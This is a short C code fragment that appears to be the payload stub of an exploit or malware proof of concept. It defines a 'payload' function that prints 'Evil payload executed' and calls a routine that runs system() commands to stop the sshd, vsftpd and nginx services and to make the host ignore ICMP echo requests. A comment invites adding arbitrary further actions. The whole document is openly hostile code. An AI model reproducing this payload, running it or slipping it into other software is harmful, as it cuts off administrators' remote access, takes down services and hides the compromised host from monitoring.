void stopServices(){
    system("systemctl stop sshd");
    system("systemctl stop vsftpd");
    system("systemctl stop nginx");
    system("echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all");
}


int payload(){
    printf("Evil payload executed >:)\n");
    stopServices();
    //Execute whatever the hell you want here
    return 0;
}